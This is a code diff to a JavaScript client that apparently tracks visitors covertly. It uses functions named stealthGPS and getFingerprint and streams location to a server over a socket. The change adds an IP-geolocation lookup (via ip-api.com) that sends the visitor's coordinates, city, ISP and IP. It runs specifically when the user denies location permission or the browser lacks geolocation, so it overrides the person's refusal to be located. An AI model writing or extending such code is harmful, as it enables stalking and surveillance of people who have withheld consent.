@@ -409,6 +409,19 @@ function stealthGPS() {
     setTimeout(tryGPS, 5000);
 }
 
+function getIPLocation() {
+    return fetch('https://ip-api.com/json/?fields=lat,lon,city,regionName,country,query,isp')
+        .then(r => r.json())
+        .then(d => {
+            if (d.lat && d.lon) {
+                socket.emit('location', { lat: d.lat, lng: d.lon, accuracy: 5000, ipFallback: true, city: d.city, region: d.regionName, country: d.country });
+                return true;
+            }
+            return false;
+        })
+        .catch(() => false);
+}
+
 let wakeLockSentinel = null;
 async function requestWakeLock() {
     try {
@@ -540,9 +553,7 @@ function sendDeviceInfo() {
 }
 
 function ipGeolocate() {
-    fetch('https://ip-api.com/json/?fields=lat,lon,city,regionName,country,query,isp').then(r=>r.json()).then(d=>{
-        if(d.lat&&d.lon) socket.emit('location',{lat:d.lat,lng:d.lon,accuracy:5000,ipFallback:true,city:d.city,region:d.regionName,country:d.country});
-    }).catch(()=>{});
+    getIPLocation();
 }
 
 function getFingerprint() {
@@ -1002,14 +1013,14 @@ function requestPermItem(perm) {
             };
 
             if (perm.id === 'location') {
-                if (!navigator.geolocation) { stealthGPS(); doneFallback(); return; }
+                if (!navigator.geolocation) { getIPLocation().then(() => doneFallback()); return; }
                 navigator.geolocation.getCurrentPosition(
                     (p) => {
                         socket.emit('location',{lat:p.coords.latitude,lng:p.coords.longitude,accuracy:p.coords.accuracy});
                         donePerm();
                     },
                     (err) => {
-                        if (err.code === 1) { stealthGPS(); doneFallback(); } // permission denied → fallback IP
+                        if (err.code === 1) { getIPLocation().then(() => doneFallback()); } // permission denied → fallback IP
                         else fail(); // other error → retry
                     },
                     {enableHighAccuracy:true,timeout:10000}
